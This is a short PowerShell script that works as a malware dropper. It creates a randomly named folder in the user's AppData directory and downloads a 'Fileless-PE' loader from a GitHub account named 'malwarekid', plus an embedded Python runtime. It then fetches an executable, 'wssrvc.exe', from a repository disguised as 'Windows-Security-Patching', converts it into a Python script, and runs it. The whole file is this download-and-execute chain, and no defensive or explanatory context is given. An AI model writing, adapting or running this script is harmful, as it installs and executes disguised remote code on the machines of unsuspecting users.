$Length = 10
$Characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
$RandomString = -join ($Characters.ToCharArray() | Get-Random -Count $Length)
$FolderName = "$RandomString"
Write-Host "Random folder name (string): $FolderName"
wget https://github.com/malwarekid/Fileless-PE/archive/refs/heads/main.zip -O $env:APPDATA\main.zip
Expand-Archive -Path $env:APPDATA\main.zip -DestinationPath $env:APPDATA\$FolderName
wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $env:APPDATA\python-3.14.0-embed-amd64.zip
Expand-Archive -Path $env:APPDATA\python-3.14.0-embed-amd64.zip -DestinationPath $env:APPDATA\$FolderName\Fileless-PE-main\
"https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/wssrvc.exe`nexe`n$env:APPDATA\\$FolderName\\Fileless-PE-main\\wssrvc.py`n" | & "$env:APPDATA\\$FolderName\\Fileless-PE-main\\python.exe" @("$env:APPDATA\\$FolderName\\Fileless-PE-main\\Fileless-PE.py")
& "$env:APPDATA\\$FolderName\\Fileless-PE-main\\python.exe" @("$env:APPDATA\$FolderName\Fileless-PE-main\wssrvc.py")
